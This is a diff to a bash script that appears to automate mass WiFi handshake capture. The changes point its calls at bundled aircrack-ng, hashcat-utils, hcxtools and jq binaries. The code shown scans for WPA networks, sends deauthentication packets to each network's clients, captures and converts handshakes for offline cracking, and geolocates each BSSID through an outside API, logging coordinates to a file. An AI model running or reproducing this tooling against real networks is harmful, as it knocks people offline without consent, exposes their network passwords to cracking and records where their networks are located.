@@ -66,9 +66,9 @@ hc_run(){
 	then
 		echo -e "[-] Interface not mentioned in config file. Run with --setup and try again!"
 		exit 0
-	elif [[ `aireplay-ng --test $interface 2>&1` != *"Injection is working"* ]]
+	elif [[ `./tools/aircrack-ng/aireplay-ng --test $interface 2>&1` != *"Injection is working"* ]]
 	then
-		echo -e "[-] Could not set wireless adapter to monitor mode. Run with --setup and try again!"
+		echo -e "[-] Could not set wireless adapter to monitor mode. Run monitor mode and try again!"
 		exit 0
 	fi
 
@@ -140,7 +140,7 @@ hc_run(){
 		echo -en "\rStatus: ${YELLOW}Scanning for WiFi networks${NC}"
 		echo -en "\033[2C"
 		while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &
-		timeout --foreground 3 airodump-ng "$interface" -t wpa -w /tmp/hc_out --output-format csv &> /dev/null
+		timeout --foreground 3 ./tools/aircrack-ng/airodump-ng "$interface" -t wpa -w /tmp/hc_out --output-format csv &> /dev/null
 		echo -en "${NC}"
 		kill $! &> /dev/null
 		echo -en "\033[1B"
@@ -179,20 +179,20 @@ hc_run(){
 			echo -en "\033[3B"
 			echo -en "\r"
 			iwconfig "$interface" channel "$channel"
-			aireplay-ng --deauth 5 -a "$bssid" "$interface" &> /dev/null &
+			./tools/aircrack-ng/aireplay-ng --deauth 5 -a "$bssid" "$interface" &> /dev/null &
 			sleep 1
 			echo -en "\033[3A"
 			echo -en "\033[2K"
 			echo -en "\rStatus: ${YELLOW}Listening for handshake${NC}"
 			while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &
 			echo -en "\033[2C"
-			timeout --foreground 10s airodump-ng -w /tmp/hc_captures/"$bssid" --output-format pcap --bssid "$bssid" --channel "$channel" "$interface" &> /dev/null
+			timeout --foreground 10s ./tools/aircrack-ng/airodump-ng -w /tmp/hc_captures/"$bssid" --output-format pcap --bssid "$bssid" --channel "$channel" "$interface" &> /dev/null
 			echo -en "${NC}"
 			kill $! &> /dev/null
 			echo -en "\033[3B"
 			echo -en "\r"
-			cap2hccapx "/tmp/hc_captures/$bssid-01.cap" "/tmp/hc_handshakes/$bssid.hccapx" &> /dev/null
-			hashflag=`wlanhcxinfo -i "/tmp/hc_handshakes/$bssid.hccapx" 2>&1`
+			./tools/hashcat-utils/cap2hccapx "/tmp/hc_captures/$bssid-01.cap" "/tmp/hc_handshakes/$bssid.hccapx" &> /dev/null
+			hashflag=`./tools/hcxtools/wlanhcxinfo -i "/tmp/hc_handshakes/$bssid.hccapx" 2>&1`
 			if [[ $hashflag == *"0 records loaded"* ]]
 			then
 				rm "/tmp/hc_handshakes/$bssid.hccapx" &> /dev/null
@@ -203,10 +203,10 @@ hc_run(){
 				loc_data="`curl -s "https://api.mylnikov.org/geolocation/wifi?v=1.2&bssid=$bssid"`"
 				if [ "`echo $loc_data`" ]
 				then
-					loc_lat="`echo $loc_data | jq .data.lat`"
-					loc_lon="`echo $loc_data | jq .data.lon`"
-					loc_range="`echo $loc_data | jq .data.range`"
-					loc_time="`echo $loc_data | jq .data.time`"
+					loc_lat="`echo $loc_data | ./tools/jq/jq .data.lat`"
+					loc_lon="`echo $loc_data | ./tools/jq/jq .data.lon`"
+					loc_range="`echo $loc_data | ./tools/jq/jq .data.range`"
+					loc_time="`echo $loc_data | ./tools/jq/jq .data.time`"
 					echo "$bssid,$essid,$loc_lat,$loc_lon,$loc_range,$loc_time" >> $f_db
 				else
 					echo "$bssid,$essid" >> $f_db
